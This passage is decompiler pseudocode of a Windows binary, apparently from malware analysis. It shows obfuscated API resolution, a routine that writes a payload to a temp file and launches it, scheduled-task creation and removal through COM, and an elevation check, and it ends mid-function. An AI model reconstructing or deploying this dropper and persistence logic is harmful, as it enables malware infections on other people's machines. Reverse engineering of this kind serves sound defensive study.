    "__int64 __fastcall sub_62746DC0(int a1, const void *a2, DWORD a3, __int64 a4, const CHAR *a5, const CHAR *a6)",
    "{",
    "  const WCHAR *v9; // rbx",
    "  HMODULE LibraryW; // r12",
    "  const CHAR *v11; // rbx",
    "  FARPROC ProcAddress; // r12",
    "  unsigned int v13; // ebx",
    "  int v14; // eax",
    "  const wchar_t *v16; // rbx",
    "  size_t v17; // rax",
    "  _DWORD *v18; // rbx",
    "  WCHAR *v19; // rsi",
    "  WCHAR *v20; // rbx",
    "  const wchar_t *v21; // rbx",
    "  size_t v22; // rax",
    "  WCHAR *v23; // rbx",
    "  wchar_t Destination[264]; // [rsp+50h] [rbp-8F8h] BYREF",
    "  WCHAR v25[264]; // [rsp+260h] [rbp-6E8h] BYREF",
    "  wchar_t TempFileName[264]; // [rsp+470h] [rbp-4D8h] BYREF",
    "  WCHAR Buffer[264]; // [rsp+680h] [rbp-2C8h] BYREF",
    "  struct _PROCESS_INFORMATION ProcessInformation; // [rsp+890h] [rbp-B8h] BYREF",
    "  _BYTE StartupInfo[152]; // [rsp+8B0h] [rbp-98h] BYREF",
    "",
    "  v9 = (const WCHAR *)sub_62746BA0(dword_6274DA00);",
    "  LibraryW = LoadLibraryW(v9);",
    "  sub_62746C30((__int64)v9);",
    "  v11 = (const CHAR *)sub_62746B10(dword_6274DA1F);",
    "  ProcAddress = GetProcAddress(LibraryW, v11);",
    "  sub_62746C30((__int64)v11);",
    "  GetTempPathW(0x104u, Buffer);",
    "  GetTempFileNameW(Buffer, (LPCWSTR)&PrefixString, 0, Buffer);",
    "  v13 = DeleteFileW(Buffer);",
    "  if ( v13 )",
    "  {",
    "    v14 = ((__int64 (__fastcall *)(_QWORD, WCHAR *))ProcAddress)(0, Buffer);",
    "    if ( !v14 || (v13 = 0, v14 == 183) )",
    "    {",
    "      GetTempFileNameW(Buffer, (LPCWSTR)&PrefixString, 0, TempFileName);",
    "      v13 = DeleteFileW(TempFileName);",
    "      if ( v13 )",
    "      {",
    "        if ( a1 == 1 )",
    "        {",
    "          v21 = (const wchar_t *)sub_62746BA0((unsigned int *)\"\\b\");",
    "          v22 = wcslen(TempFileName);",
    "          wcscpy(&v25[v22 + 260], v21);",
    "          sub_62746C30((__int64)v21);",
    "          v13 = sub_62746D10(TempFileName, a2, a3);",
    "          if ( !v13 )",
    "            return v13;",
    "          memset(StartupInfo, 0, 0x68u);",
    "          memset(&ProcessInformation, 0, sizeof(ProcessInformation));",
    "          *(_DWORD *)StartupInfo = 104;",
    "          wcscpy(Destination, TempFileName);",
    "          if ( a6 )",
    "          {",
    "            v23 = sub_62746C90(a6);",
    "            wcscat(Destination, Source);",
    "            wcscat(Destination, v23);",
    "            sub_62745BE0(v23);",
    "          }",
    "          v13 = CreateProcessW(0, Destination, 0, 0, 0, 0, 0, 0, (LPSTARTUPINFOW)StartupInfo, &ProcessInformation);",
    "          if ( v13 )",
    "            goto LABEL_12;",
    "          goto LABEL_19;",
    "        }",
    "        if ( a1 != 2 )",
    "        {",
    "          sub_62746D10(TempFileName, a2, a3);",
    "          return 0;",
    "        }",
    "        v16 = (const wchar_t *)sub_62746BA0(dword_6274DA53);",
    "        v17 = wcslen(TempFileName);",
    "        wcscpy(&v25[v17 + 260], v16);",
    "        sub_62746C30((__int64)v16);",
    "        v13 = sub_62746D10(TempFileName, a2, a3);",
    "        if ( v13 )",
    "        {",
    "          memset(StartupInfo, 0, 0x68u);",
    "          memset(&ProcessInformation, 0, sizeof(ProcessInformation));",
    "          *(_DWORD *)StartupInfo = 104;",
    "          GetSystemDirectoryW(v25, 0x104u);",
    "          v18 = sub_62746BA0(dword_6274DA68);",
    "          sub_62746C70(Destination, 0x104u, L\"%ls\\\\%ls \\\"%ls\\\",\", v25, v18, TempFileName);",
    "          v19 = sub_62746C90(a5);",
    "          wcscat(Destination, v19);",
    "          sub_62745BE0(v19);",
    "          sub_62746C30((__int64)v18);",
    "          if ( a6 )",
    "          {",
    "            v20 = sub_62746C90(a6);",
    "            wcscat(Destination, Source);",
    "            wcscat(Destination, v20);",
    "            sub_62745BE0(v20);",
    "          }",
    "          v13 = CreateProcessW(0, Destination, 0, 0, 0, 0, 0, 0, (LPSTARTUPINFOW)StartupInfo, &ProcessInformation);",
    "          if ( v13 )",
    "          {",
    "LABEL_12:",
    "            CloseHandle(ProcessInformation.hProcess);",
    "            CloseHandle(ProcessInformation.hThread);",
    "            return 1;",
    "          }",
    "LABEL_19:",
    "          DeleteFileW(TempFileName);",
    "        }",
    "      }",
    "    }",
    "  }",
    "  return v13;",
    "}",
    "",
    "",
    "void sub_62747270()",
    "{",
    "  const WCHAR *v0; // rbx",
    "  const CHAR *v1; // rbx",
    "  const CHAR *v2; // rbx",
    "  const CHAR *v3; // rbx",
    "  const WCHAR *v4; // rbx",
    "  const CHAR *v5; // rbx",
    "  const CHAR *v6; // rbx",
    "  const CHAR *v7; // rbx",
    "  const WCHAR *v8; // rbx",
    "  const CHAR *v9; // rbx",
    "",
    "  if ( !dword_62751200 )",
    "  {",
    "    if ( qword_627511F8 )",
    "    {",
    "      if ( qword_627511F0 )",
    "        goto LABEL_4;",
    "    }",
    "    else",
    "    {",
    "      v0 = (const WCHAR *)sub_62746BA0(dword_6274DAB0);",
    "      qword_627511F8 = LoadLibraryW(v0);",
    "      sub_62746C30((__int64)v0);",
    "      if ( qword_627511F0 )",
    "      {",
    "LABEL_4:",
    "        if ( qword_627511E8 )",
    "          goto LABEL_5;",
    "        goto LABEL_16;",
    "      }",
    "    }",
    "    v1 = (const CHAR *)sub_62746B10(dword_6274DAD1);",
    "    qword_627511F0 = (__int64)GetProcAddress(qword_627511F8, v1);",
    "    sub_62746C30((__int64)v1);",
    "    if ( qword_627511E8 )",
    "    {",
    "LABEL_5:",
    "      if ( qword_627511E0 )",
    "        goto LABEL_6;",
    "      goto LABEL_17;",
    "    }",
    "LABEL_16:",
    "    v2 = (const CHAR *)sub_62746B10(dword_6274DAE6);",
    "    qword_627511E8 = (__int64)GetProcAddress(qword_627511F8, v2);",
    "    sub_62746C30((__int64)v2);",
    "    if ( qword_627511E0 )",
    "    {",
    "LABEL_6:",
    "      if ( qword_627511D8 )",
    "        goto LABEL_7;",
    "      goto LABEL_18;",
    "    }",
    "LABEL_17:",
    "    v3 = (const CHAR *)sub_62746B10(dword_6274DB03);",
    "    qword_627511E0 = (__int64)GetProcAddress(qword_627511F8, v3);",
    "    sub_62746C30((__int64)v3);",
    "    if ( qword_627511D8 )",
    "    {",
    "LABEL_7:",
    "      if ( qword_627511D0 )",
    "        goto LABEL_8;",
    "      goto LABEL_19;",
    "    }",
    "LABEL_18:",
    "    v4 = (const WCHAR *)sub_62746BA0(dword_6274DB20);",
    "    qword_627511D8 = LoadLibraryW(v4);",
    "    sub_62746C30((__int64)v4);",
    "    if ( qword_627511D0 )",
    "    {",
    "LABEL_8:",
    "      if ( qword_627511C8 )",
    "        goto LABEL_9;",
    "      goto LABEL_20;",
    "    }",
    "LABEL_19:",
    "    v5 = (const CHAR *)sub_62746B10(dword_6274DB3B);",
    "    qword_627511D0 = (__int64)GetProcAddress(qword_627511D8, v5);",
    "    sub_62746C30((__int64)v5);",
    "    if ( qword_627511C8 )",
    "    {",
    "LABEL_9:",
    "      if ( qword_627511C0 )",
    "        goto LABEL_10;",
    "      goto LABEL_21;",
    "    }",
    "LABEL_20:",
    "    v6 = (const CHAR *)sub_62746B10(dword_6274DB52);",
    "    qword_627511C8 = (__int64)GetProcAddress(qword_627511D8, v6);",
    "    sub_62746C30((__int64)v6);",
    "    if ( qword_627511C0 )",
    "    {",
    "LABEL_10:",
    "      if ( qword_627511B8 )",
    "        goto LABEL_11;",
    "      goto LABEL_22;",
    "    }",
    "LABEL_21:",
    "    v7 = (const CHAR *)sub_62746B10(dword_6274DB6B);",
    "    qword_627511C0 = (__int64)GetProcAddress(qword_627511D8, v7);",
    "    sub_62746C30((__int64)v7);",
    "    if ( qword_627511B8 )",
    "    {",
    "LABEL_11:",
    "      if ( qword_627511B0 )",
    "      {",
    "LABEL_12:",
    "        ++dword_62751200;",
    "        return;",
    "      }",
    "LABEL_23:",
    "      v9 = (const CHAR *)sub_62746B10(dword_6274DBA7);",
    "      qword_627511B0 = (__int64)GetProcAddress(qword_627511B8, v9);",
    "      sub_62746C30((__int64)v9);",
    "      goto LABEL_12;",
    "    }",
    "LABEL_22:",
    "    v8 = (const WCHAR *)sub_62746BA0(dword_6274DB88);",
    "    qword_627511B8 = LoadLibraryW(v8);",
    "    sub_62746C30((__int64)v8);",
    "    if ( qword_627511B0 )",
    "      goto LABEL_12;",
    "    goto LABEL_23;",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62747580(__int64 a1, int a2)",
    "{",
    "  __int64 v5; // [rsp+28h] [rbp-40h] BYREF",
    "  _BYTE v6[56]; // [rsp+30h] [rbp-38h] BYREF",
    "",
    "  qword_627511F0(v6);",
    "  qword_627511E0(v6, &v5);",
    "  v5 += (unsigned int)(10000000 * a2);",
    "  return qword_627511E8(&v5, a1);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_627475F0(_QWORD *a1)",
    "{",
    "  unsigned int i; // ebx",
    "  unsigned int v3; // esi",
    "  _QWORD *v4; // rbp",
    "  wchar_t *v5; // rsi",
    "  unsigned int j; // esi",
    "  unsigned int v8; // [rsp+34h] [rbp-44h] BYREF",
    "  LPVOID pv; // [rsp+38h] [rbp-40h] BYREF",
    "  __int64 v10; // [rsp+40h] [rbp-38h] BYREF",
    "  _QWORD v11[6]; // [rsp+48h] [rbp-30h] BYREF",
    "",
    "  sub_62747270();",
    "  i = 0;",
    "  if ( (int)qword_627511D0(0, 0) >= 0 )",
    "  {",
    "    if ( (int)qword_627511C8(&unk_6274DBC0, 0, 1, &unk_6274E090, v11) >= 0 )",
    "    {",
    "      if ( (*(int (__fastcall **)(_QWORD, __int64 *))(*(_QWORD *)v11[0] + 40LL))(v11[0], &v10) >= 0 )",
    "      {",
    "        v8 = 0;",
    "        if ( (*(int (__fastcall **)(__int64, __int64, LPVOID *, unsigned int *))(*(_QWORD *)v10 + 24LL))(",
    "               v10,",
    "               0xFFFFFFFFLL,",
    "               &pv,",
    "               &v8) >= 0",
    "          && v8 )",
    "        {",
    "          v3 = 0;",
    "          do",
    "            v3 += ((2 * wcslen(*((const wchar_t **)pv + i++)) + 9) & 0xFFFFFFF8) + 8;",
    "          while ( v8 > i );",
    "          v4 = sub_62745B80(v3 + 8LL);",
    "          i = 0;",
    "          if ( v4 )",
    "          {",
    "            i = v8;",
    "            v5 = (wchar_t *)&v4[v8 + 1];",
    "            if ( v8 )",
    "            {",
    "              for ( i = 0; i < v8; ++i )",
    "              {",
    "                v4[i] = v5;",
    "                wcscpy(v5, *((const wchar_t **)pv + i));",
    "                v5 = (wchar_t *)((char *)v5 + ((2 * wcslen(v5) + 9) & 0xFFFFFFFFFFFFFFF8uLL));",
    "              }",
    "            }",
    "            v4[i] = 0;",
    "            *a1 = v4;",
    "          }",
    "          if ( v8 )",
    "          {",
    "            for ( j = 0; j < v8; ++j )",
    "              CoTaskMemFree(*((LPVOID *)pv + j));",
    "          }",
    "          CoTaskMemFree(pv);",
    "        }",
    "        (*(void (__fastcall **)(__int64))(*(_QWORD *)v10 + 16LL))(v10);",
    "      }",
    "      (*(void (__fastcall **)(_QWORD))(*(_QWORD *)v11[0] + 16LL))(v11[0]);",
    "    }",
    "    qword_627511C0();",
    "  }",
    "  return i;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_627477A0(HKEY *String)",
    "{",
    "  int v2; // eax",
    "  unsigned int v3; // ebx",
    "  __int64 v4; // rdi",
    "  __int64 v5; // rbx",
    "  size_t v6; // rax",
    "  tagVARIANT::$E93DC971A089CC95F6C875332324C1E7::$65D68C826D16CA47CF95571D7BFCD657 lpMem; // [rsp+28h] [rbp-20h] BYREF",
    "",
    "  *(_QWORD *)&lpMem.vt = 0;",
    "  v2 = sub_627475F0(&lpMem);",
    "  v3 = v2;",
    "  if ( v2 )",
    "  {",
    "    if ( v2 <= 0 )",
    "    {",
    "      v3 = 0;",
    "    }",
    "    else",
    "    {",
    "      v4 = 8LL * (unsigned int)(v2 - 1) + 8;",
    "      v5 = 0;",
    "      do",
    "      {",
    "        v6 = wcslen((const wchar_t *)String);",
    "        if ( !wcsncmp(*(const wchar_t **)(*(_QWORD *)&lpMem.vt + v5), (const wchar_t *)String, v6) )",
    "        {",
    "          v3 = 1;",
    "          goto LABEL_7;",
    "        }",
    "        v5 += 8;",
    "      }",
    "      while ( v5 != v4 );",
    "      v3 = 0;",
    "    }",
    "LABEL_7:",
    "    sub_62745BE0(*(LPVOID *)&lpMem.vt);",
    "  }",
    "  return v3;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62747840(__int64 a1, __int64 a2, __int64 a3, int a4, unsigned int a5)",
    "{",
    "  unsigned int v9; // esi",
    "  int v11; // [rsp+3Ch] [rbp-29Ch] BYREF",
    "  wchar_t Destination[256]; // [rsp+40h] [rbp-298h] BYREF",
    "  int v13; // [rsp+240h] [rbp-98h] BYREF",
    "  unsigned __int16 v14; // [rsp+246h] [rbp-92h]",
    "  unsigned int v15; // [rsp+248h] [rbp-90h]",
    "  _BYTE v16[2]; // [rsp+25Eh] [rbp-7Ah] BYREF",
    "  __int64 v17; // [rsp+260h] [rbp-78h] BYREF",
    "  __int64 v18; // [rsp+268h] [rbp-70h]",
    "  __int64 v19; // [rsp+270h] [rbp-68h]",
    "  __int64 v20; // [rsp+278h] [rbp-60h]",
    "  __int64 v21; // [rsp+280h] [rbp-58h]",
    "  __int64 v22; // [rsp+288h] [rbp-50h]",
    "  __int64 v23; // [rsp+290h] [rbp-48h] BYREF",
    "  __int64 v24; // [rsp+298h] [rbp-40h] BYREF",
    "  __int64 v25; // [rsp+2A0h] [rbp-38h] BYREF",
    "  _QWORD v26[6]; // [rsp+2A8h] [rbp-30h] BYREF",
    "",
    "  sub_62747270();",
    "  qword_627511D0(0, 2);",
    "  v9 = 0;",
    "  if ( (int)qword_627511C8(&unk_6274DBC0, 0, 1, &unk_6274E090, v26) >= 0 )",
    "  {",
    "    if ( (*(int (__fastcall **)(_QWORD, __int64, void *, void *, __int64 *))(*(_QWORD *)v26[0] + 64LL))(",
    "           v26[0],",
    "           a1,",
    "           &unk_6274DBD0,",
    "           &unk_6274E080,",
    "           &v25) >= 0 )",
    "    {",
    "      if ( (*(int (__fastcall **)(__int64, __int64))(*(_QWORD *)v25 + 224LL))(v25, 0x2000) >= 0",
    "        && (*(int (__fastcall **)(__int64, _BYTE *, __int64 *))(*(_QWORD *)v25 + 24LL))(v25, v16, &v24) >= 0 )",
    "      {",
    "        v17 = 0;",
    "        v18 = 0;",
    "        v19 = 0;",
    "        v20 = 0;",
    "        v21 = 0;",
    "        v22 = 0;",
    "        sub_62747580((__int64)&v13, a4);",
    "        LODWORD(v17) = 48;",
    "        v18 = v14;",
    "        HIDWORD(v17) = v13;",
    "        v19 = v15 | 0x5A000000000LL;",
    "        v20 = a5;",
    "        LODWORD(v21) = 1;",
    "        WORD2(v21) = 1;",
    "        HIDWORD(v22) = 0;",
    "        if ( (*(int (__fastcall **)(__int64, __int64 *))(*(_QWORD *)v24 + 24LL))(v24, &v17) >= 0",
    "          && (**(int (__fastcall ***)(__int64, void *, __int64 *))v25)(v25, &unk_6274E070, &v23) >= 0 )",
    "        {",
    "          if ( (unsigned int)sub_62747EE0() > 0x2FFF )",
    "          {",
    "            wcscpy(Destination, &word_6274DBBE);",
    "          }",
    "          else",
    "          {",
    "            v11 = 256;",
    "            qword_627511B0(2, Destination, &v11);",
    "          }",
    "          (*(void (__fastcall **)(__int64, wchar_t *, _QWORD))(*(_QWORD *)v25 + 240LL))(v25, Destination, 0);",
    "          (*(void (__fastcall **)(__int64, __int64))(*(_QWORD *)v25 + 256LL))(v25, a2);",
    "          if ( a3 )",
    "            (*(void (__fastcall **)(__int64, __int64))(*(_QWORD *)v25 + 272LL))(v25, a3);",
    "          (*(void (__fastcall **)(__int64, __int64))(*(_QWORD *)v25 + 336LL))(v25, 3596400000LL);",
    "          (*(void (__fastcall **)(__int64, _QWORD, __int64))(*(_QWORD *)v23 + 48LL))(v23, 0, 1);",
    "          (*(void (__fastcall **)(__int64))(*(_QWORD *)v23 + 16LL))(v23);",
    "          v9 = 1;",
    "        }",
    "        (*(void (__fastcall **)(__int64))(*(_QWORD *)v24 + 16LL))(v24);",
    "      }",
    "      (*(void (__fastcall **)(__int64))(*(_QWORD *)v25 + 16LL))(v25);",
    "    }",
    "    (*(void (__fastcall **)(_QWORD))(*(_QWORD *)v26[0] + 16LL))(v26[0]);",
    "  }",
    "  qword_627511C0();",
    "  return v9;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62747BA0(__int64 a1)",
    "{",
    "  unsigned int v2; // esi",
    "  int v3; // edi",
    "  __int64 v5; // [rsp+38h] [rbp-40h] BYREF",
    "  __int64 v6; // [rsp+40h] [rbp-38h] BYREF",
    "  _DWORD v7[11]; // [rsp+4Ch] [rbp-2Ch] BYREF",
    "",
    "  sub_62747270();",
    "  qword_627511D0(0, 2);",
    "  v2 = 0;",
    "  if ( (int)qword_627511C8(&unk_6274DBC0, 0, 1, &unk_6274E090, &v6) >= 0 )",
    "  {",
    "    v3 = 60;",
    "    do",
    "    {",
    "      if ( (*(int (__fastcall **)(__int64, __int64, void *, __int64 *))(*(_QWORD *)v6 + 48LL))(",
    "             v6,",
    "             a1,",
    "             &unk_6274E080,",
    "             &v5) < 0 )",
    "      {",
    "        v2 = 0;",
    "        goto LABEL_5;",
    "      }",
    "      if ( (*(int (__fastcall **)(__int64, _DWORD *))(*(_QWORD *)v5 + 128LL))(v5, v7) >= 0 && v7[0] == 267009 )",
    "        (*(void (__fastcall **)(__int64))(*(_QWORD *)v5 + 104LL))(v5);",
    "      if ( (*(int (__fastcall **)(__int64, __int64))(*(_QWORD *)v6 + 56LL))(v6, a1) >= 0 )",
    "      {",
    "        (*(void (__fastcall **)(__int64))(*(_QWORD *)v5 + 16LL))(v5);",
    "        v2 = 1;",
    "        goto LABEL_5;",
    "      }",
    "      (*(void (__fastcall **)(__int64))(*(_QWORD *)v5 + 16LL))(v5);",
    "      Sleep(0x3E8u);",
    "      --v3;",
    "    }",
    "    while ( v3 );",
    "    v2 = 0;",
    "LABEL_5:",
    "    (*(void (__fastcall **)(__int64))(*(_QWORD *)v6 + 16LL))(v6);",
    "  }",
    "  qword_627511C0();",
    "  return v2;",
    "}",
    "",
    "",
    "_BOOL8 __fastcall sub_62747CC0(OLECHAR *psz)",
    "{",
    "  BOOL v2; // esi",
    "  OLECHAR *v4; // rdi",
    "  BSTR v5; // rax",
    "  __m128i v6; // [rsp+30h] [rbp-128h] BYREF",
    "  IRecordInfo *v7; // [rsp+40h] [rbp-118h]",
    "  __m128i v8; // [rsp+50h] [rbp-108h] BYREF",
    "  IRecordInfo *v9; // [rsp+60h] [rbp-F8h]",
    "  __m128i v10; // [rsp+70h] [rbp-E8h] BYREF",
    "  IRecordInfo *pRecInfo; // [rsp+80h] [rbp-D8h]",
    "  __m128i si128; // [rsp+90h] [rbp-C8h] BYREF",
    "  __int64 v13; // [rsp+A0h] [rbp-B8h]",
    "  VARIANTARG v14; // [rsp+B0h] [rbp-A8h] BYREF",
    "  VARIANTARG v15; // [rsp+D0h] [rbp-88h] BYREF",
    "  VARIANTARG v16; // [rsp+F0h] [rbp-68h] BYREF",
    "  _BYTE pvarg[32]; // [rsp+110h] [rbp-48h] BYREF",
    "  __int64 v18; // [rsp+130h] [rbp-28h] BYREF",
    "  LPVOID ppv[4]; // [rsp+138h] [rbp-20h] BYREF",
    "",
    "  v2 = 0;",
    "  if ( CoInitializeEx(0, 0) < 0 )",
    "    return 0;",
    "  if ( CoCreateInstance(&stru_6274E060, 0, 1u, &stru_6274E0A0, ppv) >= 0 )",
    "  {",
    "    VariantInit((VARIANTARG *)pvarg);",
    "    VariantInit(&v16);",
    "    VariantInit(&v15);",
    "    VariantInit(&v14);",
    "    si128 = _mm_load_si128((const __m128i *)pvarg);",
    "    v13 = *(_QWORD *)&pvarg[16];",
    "    v10 = _mm_load_si128((const __m128i *)&v16);",
    "    pRecInfo = v16.pRecInfo;",
    "    v8 = _mm_load_si128((const __m128i *)&v15);",
    "    v9 = v15.pRecInfo;",
    "    v6 = _mm_load_si128((const __m128i *)&v14);",
    "    v7 = v14.pRecInfo;",
    "    v2 = 0;",
    "    if ( (*(int (__fastcall **)(LPVOID, __m128i *, __m128i *, __m128i *, __m128i *))(*(_QWORD *)ppv[0] + 80LL))(",
    "           ppv[0],",
    "           &si128,",
    "           &v10,",
    "           &v8,",
    "           &v6) >= 0 )",
    "    {",
    "      v4 = SysAllocString(&::psz);",
    "      if ( (*(int (__fastcall **)(LPVOID, OLECHAR *, __int64 *))(*(_QWORD *)ppv[0] + 56LL))(ppv[0], v4, &v18) >= 0 )",
    "      {",
    "        v5 = SysAllocString(psz);",
    "        v2 = (*(int (__fastcall **)(__int64, BSTR, _QWORD))(*(_QWORD *)v18 + 120LL))(v18, v5, 0) >= 0;",
    "        SysFreeString(v4);",
    "      }",
    "      SysFreeString(v4);",
    "    }",
    "    VariantClear(&v14);",
    "    VariantClear(&v15);",
    "    VariantClear(&v16);",
    "    VariantClear((VARIANTARG *)pvarg);",
    "    (*(void (__fastcall **)(LPVOID))(*(_QWORD *)ppv[0] + 16LL))(ppv[0]);",
    "  }",
    "  CoUninitialize();",
    "  return v2;",
    "}",
    "",
    "",
    "__int64 sub_62747EE0()",
    "{",
    "  unsigned int (__fastcall *v0)(__int64, __int64, _DWORD *); // rbx",
    "  __int64 v1; // rax",
    "  unsigned int v2; // esi",
    "  _QWORD *v3; // rbx",
    "  __int64 (__fastcall *v4)(_QWORD, _QWORD); // rsi",
    "  _BYTE *v5; // rax",
    "  const WCHAR *v7; // rbx",
    "  const CHAR *v8; // rbx",
    "  const CHAR *v9; // rbx",
    "  const WCHAR *v10; // rbx",
    "  const CHAR *v11; // rbx",
    "  const CHAR *v12; // rbx",
    "  const CHAR *v13; // rbx",
    "  const CHAR *v14; // rbx",
    "  _DWORD dwBytes[9]; // [rsp+34h] [rbp-24h] BYREF",
    "",
    "  if ( qword_62751260 )",
    "  {",
    "    if ( qword_62751250 )",
    "      goto LABEL_3;",
    "  }",
    "  else",
    "  {",
    "    v7 = (const WCHAR *)sub_62746BA0(dword_6274DBF0);",
    "    qword_62751260 = LoadLibraryW(v7);",
    "    sub_62746C30((__int64)v7);",
    "    if ( qword_62751250 )",
    "    {",
    "LABEL_3:",
    "      if ( qword_62751248 )",
    "        goto LABEL_4;",
    "      goto LABEL_18;",
    "    }",
    "  }",
    "  v8 = (const CHAR *)sub_62746B10(dword_6274DC11);",
    "  qword_62751250 = GetProcAddress(qword_62751260, v8);",
    "  sub_62746C30((__int64)v8);",
    "  if ( qword_62751248 )",
    "  {",
    "LABEL_4:",
    "    if ( qword_62751240 )",
    "      goto LABEL_5;",
    "    goto LABEL_19;",
    "  }",
    "LABEL_18:",
    "  v9 = (const CHAR *)sub_62746B10(dword_6274DC2B);",
    "  qword_62751248 = (__int64 (__fastcall *)(_QWORD))GetProcAddress(qword_62751260, v9);",
    "  sub_62746C30((__int64)v9);",
    "  if ( qword_62751240 )",
    "  {",
    "LABEL_5:",
    "    if ( qword_62751238 )",
    "      goto LABEL_6;",
    "    goto LABEL_20;",
    "  }",
    "LABEL_19:",
    "  v10 = (const WCHAR *)sub_62746BA0(dword_6274DC40);",
    "  qword_62751240 = LoadLibraryW(v10);",
    "  sub_62746C30((__int64)v10);",
    "  if ( qword_62751238 )",
    "  {",
    "LABEL_6:",
    "    if ( qword_62751230 )",
    "      goto LABEL_7;",
    "    goto LABEL_21;",
    "  }",
    "LABEL_20:",
    "  v11 = (const CHAR *)sub_62746B10(dword_6274DC61);",
    "  qword_62751238 = (__int64)GetProcAddress(qword_62751240, v11);",
    "  sub_62746C30((__int64)v11);",
    "  if ( qword_62751230 )",
    "  {",
    "LABEL_7:",
    "    if ( qword_62751228 )",
    "      goto LABEL_8;",
    "LABEL_22:",
    "    v13 = (const CHAR *)sub_62746B10(dword_6274DC98);",
    "    qword_62751228 = (__int64 (__fastcall *)(_QWORD))GetProcAddress(qword_62751240, v13);",
    "    sub_62746C30((__int64)v13);",
    "    if ( qword_62751220 )",
    "      goto LABEL_9;",
    "    goto LABEL_23;",
    "  }",
    "LABEL_21:",
    "  v12 = (const CHAR *)sub_62746B10(dword_6274DC7A);",
    "  qword_62751230 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD))GetProcAddress(qword_62751240, v12);",
    "  sub_62746C30((__int64)v12);",
    "  if ( !qword_62751228 )",
    "    goto LABEL_22;",
    "LABEL_8:",
    "  if ( qword_62751220 )",
    "    goto LABEL_9;",
    "LABEL_23:",
    "  v14 = (const CHAR *)sub_62746B10(dword_6274DCB8);",
    "  qword_62751220 = (__int64)GetProcAddress(qword_62751240, v14);",
    "  sub_62746C30((__int64)v14);",
    "LABEL_9:",
    "  v0 = (unsigned int (__fastcall *)(__int64, __int64, _DWORD *))qword_62751238;",
    "  v1 = qword_62751250();",
    "  v2 = 0;",
    "  if ( v0(v1, 24, &dwBytes[1]) )",
    "  {",
    "    dwBytes[0] = 0;",
    "    qword_62751230(*(_QWORD *)&dwBytes[1], 25, 0, 0, dwBytes);",
    "    v3 = sub_62745B80(dwBytes[0]);",
    "    if ( v3 )",
    "    {",
    "      if ( (unsigned int)qword_62751230(*(_QWORD *)&dwBytes[1], 25, v3, dwBytes[0], dwBytes) )",
    "      {",
    "        v4 = (__int64 (__fastcall *)(_QWORD, _QWORD))qword_62751220;",
    "        v5 = (_BYTE *)qword_62751228(*v3);",
    "        v2 = *(_DWORD *)v4(*v3, (unsigned __int8)(*v5 - 1));",
    "      }",
    "      sub_62745BE0(v3);",
    "    }",
    "    qword_62751248(*(_QWORD *)&dwBytes[1]);",
    "  }",
    "  return v2;",
    "}",
    "",
    "",
    "_BOOL8 sub_62748210()",
    "{",
    "  return (unsigned int)sub_62747EE0() > 0x2FFF;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62748230(HKEY *String2)",
    "{",
    "  __int64 (__fastcall *v2)(__int64, int *); // rbx",
    "  __int64 v3; // rax",
    "  const wchar_t **v4; // rsi",
    "  unsigned int v5; // ebx",
    "  __int64 v6; // rbx",
    "  const WCHAR *v8; // rbx",
    "  const CHAR *v9; // rbx",
    "  const WCHAR *v10; // rbx",
    "  const CHAR *v11; // rbx",
    "  int v12[7]; // [rsp+2Ch] [rbp-1Ch] BYREF",
    "",
    "  if ( qword_62751260 )",
    "  {",
    "    if ( qword_62751258 )",
    "      goto LABEL_3;",
    "  }",
    "  else",
    "  {",
    "    v8 = (const WCHAR *)sub_62746BA0(dword_6274DCD8);",
    "    qword_62751260 = LoadLibraryW(v8);",
    "    sub_62746C30((__int64)v8);",
    "    if ( qword_62751258 )",
    "    {",
    "LABEL_3:",
    "      if ( qword_62751218 )",
    "        goto LABEL_4;",
    "LABEL_16:",
    "      v10 = (const WCHAR *)sub_62746BA0(dword_6274DD18);",
    "      qword_62751218 = LoadLibraryW(v10);",
    "      sub_62746C30((__int64)v10);",
    "      if ( qword_62751210 )",
    "        goto LABEL_5;",
    "      goto LABEL_17;",
    "    }",
    "  }",
    "  v9 = (const CHAR *)sub_62746B10(dword_6274DCF9);",
    "  qword_62751258 = GetProcAddress(qword_62751260, v9);",
    "  sub_62746C30((__int64)v9);",
    "  if ( !qword_62751218 )",
    "    goto LABEL_16;",
    "LABEL_4:",
    "  if ( qword_62751210 )",
    "    goto LABEL_5;",
    "LABEL_17:",
    "  v11 = (const CHAR *)sub_62746B10(dword_6274DD37);",
    "  qword_62751210 = (__int64)GetProcAddress(qword_62751218, v11);",
    "  sub_62746C30((__int64)v11);",
    "LABEL_5:",
    "  v2 = (__int64 (__fastcall *)(__int64, int *))qword_62751210;",
    "  v3 = qword_62751258();",
    "  v4 = (const wchar_t **)v2(v3, v12);",
    "  v5 = 0;",
    "  if ( v4 )",
    "  {",
    "    if ( v12[0] > 1 )",
    "    {",
    "      v6 = 1;",
    "      do",
    "      {",
    "        if ( !wcscmp(v4[v6], (const wchar_t *)String2) )",
    "        {",
    "          v5 = 1;",
    "          goto LABEL_11;",
    "        }",
    "        ++v6;",
    "      }",
    "      while ( v12[0] > (int)v6 );",
    "      v5 = 0;",
    "    }",
    "LABEL_11:",
    "    LocalFree(v4);",
    "  }",
    "  return v5;",
    "}",
    "",
    "",
    "__int64 sub_627483E0()",
    "{",
    "  HKEY *v0; // rbx",
    "  unsigned int v1; // esi",
    "",
    "  v0 = (HKEY *)sub_62746BA0(dword_6274DD52);",
    "  v1 = sub_62748230(v0);",
    "  sub_62746C30((__int64)v0);",
    "  return v1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62748410(__int64 a1)",
    "{",
    "  return ((int)*(unsigned __int16 *)(*(int *)(a1 + 60) + a1 + 22) >> 13) & 1;",
    "}",
    "",
    "",
    "void (*sub_62748420())(void)",
    "{",
    "  void (*result)(void); // rax",
    "",
    "  result = (void (*)(void))(*off_6274A660)[0];",
    "  if ( (*off_6274A660)[0] )",
    "  {",
    "    do",
    "    {",
    "      result();",
    "      result = (void (*)(void))(*off_6274A660)[1];",
    "      off_6274A660 = (__int64 (*)[38])((char *)off_6274A660 + 8);",
    "    }",
    "    while ( result );",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "void sub_62748460()",
    "{",
    "  void (**v0)(void); // rbx",
    "  __int64 *v1; // rsi",
    "  unsigned int v2; // eax",
